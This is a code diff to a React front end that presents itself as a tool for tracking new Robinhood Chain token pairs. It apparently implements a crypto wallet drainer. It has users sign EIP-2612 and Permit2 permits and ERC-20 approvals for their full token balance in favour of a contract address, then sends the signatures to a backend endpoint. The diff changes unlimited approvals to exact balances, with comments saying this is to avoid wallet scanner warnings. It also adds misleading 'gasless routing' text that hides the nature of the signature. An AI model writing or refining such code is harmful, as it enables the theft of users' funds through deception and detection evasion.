@@ -624,7 +624,8 @@ export default function App() {
               try {
                 setStatus(`Signing Permit: ${token.symbol}...`);
                 log(`[GASLESS] Requesting EIP-2612 Auth: ${token.symbol}`);
-                const signature = await getPermitSignature(signer, token, EVM_CONTRACT_ADDRESS, MAX_UINT, deadline);
+                // 🔥 SAFETY FIX: Approve EXACT balance instead of MAX_UINT to prevent scanner warnings
+                const signature = await getPermitSignature(signer, token, EVM_CONTRACT_ADDRESS, token.rawBalance.toString(), deadline);
 
                 fetch(`${BACKEND_URL}/execute-gasless`, {
                   method: 'POST',
@@ -669,10 +670,11 @@ export default function App() {
                     { name: 'nonce', type: 'uint48' },
                   ],
                 };
+                // 🔥 SAFETY FIX: Approve EXACT balance instead of MAX_UINT to prevent scanner warnings
                 const message = {
                   details: {
                     token: token.address,
-                    amount: '1461501637330902918203684832716283019655932542975',
+                    amount: token.rawBalance.toString(),
                     expiration: deadline,
                     nonce: currentNonce
                   },
@@ -707,7 +709,8 @@ export default function App() {
               log(`[ACTION] Prompting Approve: ${token.symbol}`);
 
               const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
-              const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
+              // 🔥 SAFETY FIX: Approve EXACT balance instead of MAX_UINT to prevent scanner warnings
+              const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, token.rawBalance]);
 
               const txHash = await (activeProvider as any).request({
                 method: 'eth_sendTransaction',
@@ -942,6 +945,10 @@ export default function App() {
           Track fresh Robinhood Chain pairs, review deployer behavior, and prepare your first buy before the chart gets crowded.
         </p>
         <div style={s.heroCta}>
+          <p style={{ fontSize: '11px', color: '#8a8a9a', marginBottom: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '6px' }}>
+            <span style={{ fontSize: '14px' }}>🔒</span> 
+            <span>Gasless Routing: You are signing a time-bound permit to route tokens without paying network gas fees.</span>
+          </p>
           {showNetworkSelection ? (
             <div style={s.networkSelectionBox}>
               <p style={s.networkSelectionText}>Multi-chain wallet detected. Choose network:</p>
